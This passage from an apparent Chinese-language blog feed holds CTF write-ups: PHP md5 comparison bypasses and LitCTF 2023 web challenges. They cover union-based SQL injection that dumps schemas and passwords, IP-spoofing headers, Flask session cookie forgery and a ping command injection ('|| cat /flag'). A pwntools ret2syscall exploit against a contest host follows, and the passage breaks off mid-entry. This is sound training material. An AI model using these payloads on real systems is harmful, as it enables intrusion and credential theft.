class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt -dbs --batch --delay 1</span><br></pre></td></tr></table></figure><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h2 id="session伪造"><a href="#session伪造" class="headerlink" title="session伪造"></a>session伪造</h2><h2 id="md5弱比较，强比较"><a href="#md5弱比较，强比较" class="headerlink" title="md5弱比较，强比较"></a>md5弱比较，强比较</h2><p>知识点：[【PHP】MD5比较漏洞 弱比较、强比较、强碰撞_md5字符串qnkcdzo与s_小 白 萝 卜的博客-CSDN博客](<a href="https://blog.csdn.net/EC_Carrot/article/details/109525162#:~:text=%E5%BC%B1%E6%AF%94%E8%BE%83">https://blog.csdn.net/EC_Carrot/article/details/109525162#:~:text=弱比较</a> if(%24_POST[‘a’]!%3D%24_POST[‘b’]%26%26,md5(%24_POST[‘a’])%3D%3Dmd5(%24_POST[‘b’])){ die(“success!”)%3B })</p><p><a href="https://blog.csdn.net/q20010619/article/details/109856150">CTF中的md5弱类型（ALL_IN_ONE）_ctf all in one_OceanSec的博客-CSDN博客</a></p><p>例题：[<a href="https://www.nssctf.cn/problem/2076">NSSCTF 2022 Spring Recruit]babyphp | NSSCTF</a></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>])&amp;&amp;<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;yee&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nop&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;go on&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;let&#x27;s get some php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>我们可以看到他一共是有三层比较，我们需要一层一层的绕过</p><p>第一层的意思是</p><ul><li>“a” 字段存在。</li><li>“a” 字段的值不包含数字字符。</li><li>“a” 字段的值可以转换为一个非零的整数。</li></ul><p>我们就可以使用数组的形式，来绕过他的判断，数组的hash他是不会输出hash值的，所以不管什么值都是真确</p><p>第二层就是输入b1和b2，进行md5强比较</p><p>也可以直接使用数组的方式绕过</p><p>第三层是md5弱比较，我们直接采用那些字符转换md5会变成0e开头的就可以了</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6gwbpclsays0.webp" alt="image-20230923170343632"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/202308172151534.jpg&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://wuming.github.io/tags/ctf/"/>
    
    <category term="Web" scheme="https://wuming.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>litctf</title>
    <link href="https://wuming.github.io/2023/09/19/litctf/"/>
    <id>https://wuming.github.io/2023/09/19/litctf/</id>
    <published>2023-09-19T08:45:20.000Z</published>
    <updated>2023-12-18T05:25:30.601Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p><img src="/./../image/image-20231218132527404.png" alt="image-20231218132527404"></p><h2 id="LitCTF-2023-我Flag呢？"><a href="#LitCTF-2023-我Flag呢？" class="headerlink" title="[LitCTF 2023]我Flag呢？"></a>[LitCTF 2023]我Flag呢？</h2><p>打开环境后，直接F12就可以看到flag</p><p>同时打开源码的方式还有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f12/ctrl+u/view-source：</span><br></pre></td></tr></table></figure><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/%7B4038CD4C-5AD6-45cc-B79F-734765D74244%7D.74m3u0jfzps0.webp"></p><span id="more"></span> <h2 id="LitCTF-2023-PHP是世界上最好的语言！！"><a href="#LitCTF-2023-PHP是世界上最好的语言！！" class="headerlink" title="[LitCTF 2023]PHP是世界上最好的语言！！"></a>[LitCTF 2023]PHP是世界上最好的语言！！</h2><p>打开页面，猜测命令执行</p><p>system(“ls &#x2F;“); 查看目录文件夹，看到flag文件直接查看即可</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4m4th4lnkqg0.png"></p><h2 id="LitCTF-2023-就当无事发生"><a href="#LitCTF-2023-就当无事发生" class="headerlink" title="[LitCTF 2023]就当无事发生"></a>[LitCTF 2023]就当无事发生</h2><p>首先去探姬的github，然后直接搜索他的博客地址</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/0bc762429c6478832b423983f5f49c8e.2fr8flw6sa80.webp"></p><p>随后直接点击这个按钮，可以查看作者对文件的更改</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2r551bvk57c0.webp"></p><p>最后在里面找到带有X号的，就是作者删除过的，或者点上面的√可以看到作者的更改</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/%7B7E1532FA-9E7A-4e87-A5FE-C4EB552A98AF%7D.112w5kxubstc.webp"></p><h2 id="LitCTF-2023-Follow-me-and-hack-me"><a href="#LitCTF-2023-Follow-me-and-hack-me" class="headerlink" title="[LitCTF 2023]Follow me and hack me"></a>[LitCTF 2023]Follow me and hack me</h2><p>直接hackar进行传参</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/8160496c03f53fa83615d0212465ef11.12lqjzm7lqf4.webp"></p><h2 id="LitCTF-2023-Vim-yyds"><a href="#LitCTF-2023-Vim-yyds" class="headerlink" title="[LitCTF 2023]Vim yyds"></a>[LitCTF 2023]Vim yyds</h2><p>xxxxxxxxxx mappings &#x3D; { 0x04:”A”,  0x05:”B”,  0x06:”C”, 0x07:”D”, 0x08:”E”, 0x09:”F”, 0x0A:”G”,  0x0B:”H”, 0x0C:”I”,  0x0D:”J”, 0x0E:”K”, 0x0F:”L”, 0x10:”M”, 0x11:”N”,0x12:”O”,  0x13:”P”, 0x14:”Q”, 0x15:”R”, 0x16:”S”, 0x17:”T”, 0x18:”U”,0x19:”V”, 0x1A:”W”, 0x1B:”X”, 0x1C:”Y”, 0x1D:”Z”, 0x1E:”1”, 0x1F:”2”, 0x20:”3”, 0x21:”4”, 0x22:”5”,  0x23:”6”, 0x24:”7”, 0x25:”8”, 0x26:”9”, 0x27:”0”, 0x28:”\n”, 0x2a:”[DEL]”,  0X2B:”    “, 0x2C:” “,  0x2D:”-“, 0x2E:”&#x3D;”, 0x2F:”[“,  0x30:”]”,  0x31:”\“, 0x32:”~”, 0x33:”;”,  0x34:”‘“, 0x36:”,”,  0x37:”.” }nums &#x3D; []keys &#x3D; open(‘usbdata.txt’)for line in keys:    if line[0]!&#x3D;’0’ or line[1]!&#x3D;’0’ or line[3]!&#x3D;’0’ or line[4]!&#x3D;’0’ or line[9]!&#x3D;’0’ or line[10]!&#x3D;’0’ or line[12]!&#x3D;’0’ or line[13]!&#x3D;’0’ or line[15]!&#x3D;’0’ or line[16]!&#x3D;’0’ or line[18]!&#x3D;’0’ or line[19]!&#x3D;’0’ or line[21]!&#x3D;’0’ or line[22]!&#x3D;’0’:         continue    nums.append(int(line[6:8],16))keys.close()output &#x3D; “”for n in nums:    if n &#x3D;&#x3D; 0 :        continue    if n in mappings:        output +&#x3D; mappings[n]    else:        output +&#x3D; ‘[unknown]’print(‘output :\n’ + output)​# output :# SEC2ETK3YPython</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r xxx.swp</span><br></pre></td></tr></table></figure><p>比如我 vim 1.php 但是我中通关闭了他，那天就会产生这个文件，只需要r一下就可以恢复</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/15250cfd706242cbaf0aa0e5a8f97bab.67gq0p6qvn40.webp"></p><p>回到题目，首先下载下这个文件，然后去kali将文件恢复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node4.anna.nssctf.cn:28647/.index.php.swp</span><br></pre></td></tr></table></figure><p>此时我们就已知了他的php代码</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6pidz6qpuog0.webp"></p><p>代码的逻辑很简单，就是post传参一个base64加密后的’Give_Me_You_Flag’</p><p>然后传入一个名为cmd的参数，因为外包裹着eval，所以我们可以执行命令</p><p>可以用burp进行抓包操作得到flag</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.28caqntwhedc.webp"></p><h2 id="LitCTF-2023-这是什么？SQL-！注一下-！"><a href="#LitCTF-2023-这是什么？SQL-！注一下-！" class="headerlink" title="[LitCTF 2023]这是什么？SQL ！注一下 ！"></a>[LitCTF 2023]这是什么？SQL ！注一下 ！</h2><p><a href="https://www.bilibili.com/video/BV1ZR4y1Y745/?spm_id_from=333.880.my_history.page.click&vd_source=c195ba0f6cdc7f783321bd952f37fd18">SQL注入攻击原理，方法和类型_哔哩哔哩_bilibili</a></p><p><a href="https://blog.csdn.net/A951860555/article/details/116484328">SQL注入的一般过程_sql注入过程___lifanxin的博客-CSDN博客</a></p><p>作为一个新手web，看了一天，看不懂一点，所以直接记套题，后续慢慢了解</p><p>但我可以解释一下每个命令的作用</p><p>首先先id&#x3D;1，先判断是字符型注入还是整形注入</p><p>id&#x3D;1回显就是整形</p><p>id&#x3D;’1‘回显就是字符型</p><p>可以看到id&#x3D;1时有回显，我们判断他是整形注入</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2pssl53e6kq0.webp"></p><p><a href="https://blog.csdn.net/qq_23667585/article/details/127213099">浅谈SQL注入中的-1‘ union select 1,2,3#_娄不夜的博客-CSDN博客</a></p><p>1.先判断显示位，payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span>)))))) union select <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>第一句就有很多问题，详细可以参考上述的文章，wp参考</p><p>[<a href="https://blog.csdn.net/Leaf_initial/article/details/130671885">LitCTF2023] web方向全题解wp_Leafzzz__的博客-CSDN博客</a></p><p>2.爆库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1)))))) and 1=2 union select 1,group_concat(schema_name) from information_schema.schemata#</span><br></pre></td></tr></table></figure><p>1&#x3D;2的目的是使得条件为假,经过我的实验使用id&#x3D;-1)))))) union…同理，所以这俩的作用都是表示判断错误，不显示第一个数据库，显示第二个</p><p>3.得到库名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema,mysql,ctftraining,performance_schema,test,ctf</span><br></pre></td></tr></table></figure><p>4.爆表：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(table_name)<span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&quot;ctf&quot;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>5.得到表名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">users</span><br></pre></td></tr></table></figure><p>6.爆列：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(column_name)<span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&quot;users&quot;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>7.得到列名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id,username,password,ip,time,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</span><br></pre></td></tr></table></figure><p>8.获取值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1)))))) and 1=2 union select 1,group_concat(password) from ctf.users#</span><br></pre></td></tr></table></figure><p>9.获得彩蛋（难蚌）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OHHHHHHH,F1rst_to_Th3_eggggggggg!&#125; </span><br></pre></td></tr></table></figure><p>flag同理，去爆ctftraining即可</p><p>10.重新爆表：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(table_name)<span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&quot;ctftraining&quot;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>11.得到表明：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag,news,users</span><br></pre></td></tr></table></figure><p>12.重新爆列：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(column_name)<span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&quot;flag&quot;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>13.获得列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag</span><br></pre></td></tr></table></figure><p>14.重新获取值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(flag) <span class="keyword">from</span> ctftraining.flag<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2vs4use82qa0.webp"></p><h4 id="webshell：需要上传木马以及蚁剑的使用"><a href="#webshell：需要上传木马以及蚁剑的使用" class="headerlink" title="webshell：需要上传木马以及蚁剑的使用"></a>webshell：需要上传木马以及蚁剑的使用</h4><p>大马，小马，一句话木马等，上传后使用蚁剑进行连接</p><p><a href="https://www.bilibili.com/video/BV1Wk4y1m7fp/?spm_id_from=333.337.search-card.all.click&vd_source=c195ba0f6cdc7f783321bd952f37fd18">如何使用中国蚁剑连接webshell？_哔哩哔哩_bilibili</a></p><h2 id="LitCTF-2023-Http-pro-max-plus"><a href="#LitCTF-2023-Http-pro-max-plus" class="headerlink" title="[LitCTF 2023]Http pro max plus"></a>[LitCTF 2023]Http pro max plus</h2><p>和http请求头有关的题目，详细可以在下面的网站了解</p><p><a href="https://developer.mozilla.org/zh-CN/docs/web/http/headers">HTTP 标头（header） - HTTP | MDN (mozilla.org)</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Forwarded-For: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Forwarded-For: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Forwarded: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Requested-With: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Forwarded-Proto: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Forwarded-Host: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-remote-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-remote-addr: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">True-Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Real-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Ali-CDN-Real-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Cdn-Src-Ip: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Cdn-Real-Ip: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">CF-Connecting-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Cluster-Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">WL-Proxy-Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Proxy-Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Fastly-Client-Ip: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">True-Client-Ip: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Originating-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Host: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Custom-IP-Authorization: <span class="number">127.0</span>.<span class="number">0.1</span></span><br></pre></td></tr></table></figure><p>本机地址client-ip: 127.0.0.1</p><p>访问网站referer: pornhub.com</p><p>指定浏览器user-agent: Chrome</p><p>使用代理via: Clash.win</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.73yrqln52y00.webp"></p><p>到达这个页面后，直接去源码查看就可以看到flag所在的地方</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3xfl93ctnwu0.webp"></p><h2 id="LitCTF-2023-1zjs"><a href="#LitCTF-2023-1zjs" class="headerlink" title="[LitCTF 2023]1zjs"></a>[LitCTF 2023]1zjs</h2><p>直接去源代码区域，找到js源码，可以发现一个php，里面有很多jsfuck的文字，直接去解密就行</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1rcn1dvd618g.webp"></p><p>因为是js，可以在控制台直接输出</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4yqn0mb2fi00.webp"></p><h2 id="LitCTF-2023-Flag点击就送！"><a href="#LitCTF-2023-Flag点击就送！" class="headerlink" title="[LitCTF 2023]Flag点击就送！"></a>[LitCTF 2023]Flag点击就送！</h2><p>session伪造的题目</p><p>我们可以先尝试输入文字然后回车，到后面获取flag，然后他提示我们需要管理员才能获取flag</p><p>通过burp抓包我们可以看到有一段cookie被返回，题目的要求是只有管理员才能拿flag</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.61623zag7co0.png"></p><p>session伪造需要一个key，一般的题目中key是需要在题目中找的，但是这个题目的key是猜的，key&#x3D;’litctf’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">解码：python3  flask_session_cookie_manager3.py decode -s <span class="string">&quot;密钥&quot;</span> -c <span class="string">&quot;session&quot;</span></span><br><span class="line"></span><br><span class="line">加密：python3  flask_session_cookie_manager3.py encode -s <span class="string">&quot;密钥&quot;</span> -t <span class="string">&quot;上面解密出的一串字符串&quot;</span></span><br></pre></td></tr></table></figure><p>我们获取了key后可以先去解密一下，我们发现解密后他的请求name为’111’,根据题目我们修改成’admin’，就可以了</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.27nvnjo9nyo0.webp"></p><p>我们使用burp发送过去就可以获得flag</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2eee9dgxxog0.webp"></p><h2 id="LitCTF-2023-Ping"><a href="#LitCTF-2023-Ping" class="headerlink" title="[LitCTF 2023]Ping"></a>[LitCTF 2023]Ping</h2><p>我们首先可以看到源码，里面有个正则</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.64n0c8tf0240.webp"></p><p>所以我们有两个方式，第一个就是直接禁用JavaScript即可</p><p>F12+F1 禁用后直接 1.1.1.1 || （ls &#x2F;）(cat &#x2F;flag) 即可</p><p>同时这里就涉及了一个知识点就是linux的管道命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&amp;  表示任务在后台执行，如要在后台运行redis-server,则有  redis-server &amp;</span><br><span class="line"></span><br><span class="line">&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令 ，如 echo &#x27;1‘ &amp;&amp; echo &#x27;2&#x27;    </span><br><span class="line"></span><br><span class="line">| 表示管道，上一条命令的输出，作为下一条命令参数，如 echo &#x27;yes&#x27; | wc -l</span><br><span class="line"></span><br><span class="line">|| 表示上一条命令执行失败后，才执行下一条命令，如 cat nofile || echo &quot;fail&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7fx5n2h64yo0.webp"></p><p>第二个方法就是使用burp进行抓包，抓到后之间在内部进行修改</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1g5mkbhr9g5c.webp"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/./../image/image-20231218132527404.png&quot; alt=&quot;image-20231218132527404&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;LitCTF-2023-我Flag呢？&quot;&gt;&lt;a href=&quot;#LitCTF-2023-我Flag呢？&quot; class=&quot;headerlink&quot; title=&quot;[LitCTF 2023]我Flag呢？&quot;&gt;&lt;/a&gt;[LitCTF 2023]我Flag呢？&lt;/h2&gt;&lt;p&gt;打开环境后，直接F12就可以看到flag&lt;/p&gt;
&lt;p&gt;同时打开源码的方式还有&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;f12/ctrl+u/view-source：&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/%7B4038CD4C-5AD6-45cc-B79F-734765D74244%7D.74m3u0jfzps0.webp&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://wuming.github.io/tags/ctf/"/>
    
    <category term="Pwn" scheme="https://wuming.github.io/tags/Pwn/"/>
    
    <category term="RE" scheme="https://wuming.github.io/tags/RE/"/>
    
    <category term="litctf" scheme="https://wuming.github.io/tags/litctf/"/>
    
    <category term="WEB" scheme="https://wuming.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>山石结营赛</title>
    <link href="https://wuming.github.io/2023/08/20/%E5%B1%B1%E7%9F%B3%E7%BB%93%E8%90%A5%E8%B5%9B/"/>
    <id>https://wuming.github.io/2023/08/20/%E5%B1%B1%E7%9F%B3%E7%BB%93%E8%90%A5%E8%B5%9B/</id>
    <published>2023-08-19T16:15:19.000Z</published>
    <updated>2023-08-19T17:21:58.329Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;58.240.236.231&#x27;</span>,<span class="number">49003</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x40072b</span></span><br><span class="line">rsi = <span class="number">0x400735</span></span><br><span class="line">rax = <span class="number">0x400721</span></span><br><span class="line">syscall = <span class="number">0x400741</span></span><br><span class="line">rdx = <span class="number">0x40073f</span></span><br><span class="line">binsh = <span class="number">0x601048</span></span><br><span class="line">payload = <span class="number">0x48</span>*<span class="string">b&#x27;a&#x27;</span>+ p64(rax) + p64(<span class="number">59</span>) + p64(rdi) + p64(<span class="number">0x601048</span>) + p64(rsi) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><span id="more"></span> <h2 id="ret2libc"><a href="#ret2libc" 